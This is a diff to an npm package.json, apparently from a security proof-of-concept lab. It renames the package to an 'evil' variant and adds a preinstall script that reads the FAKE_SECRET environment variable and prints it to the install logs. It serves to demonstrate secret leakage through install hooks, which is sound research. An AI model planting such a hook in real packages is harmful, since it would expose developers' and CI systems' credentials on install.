@@ -1,6 +1,9 @@
 {
-  "name": "genuine-try-poc-target",
-  "version": "0.0.1",
-  "private": true,
-  "description": "Clean target. Sacrificial lab for security PoC."
-}
+    "name": "genuine-try-poc-evil",
+    "version": "0.0.1",
+    "private": true,
+    "description": "Attacker payload — preinstall reads secret from env and emits to logs.",
+    "scripts": {
+      "preinstall": "node -e \"console.log('=========_______============= FAKE_SECRET=' +(process.env.FAKE_SECRET || '<empty>'+'=========_______============='))\""
+    }
+  }
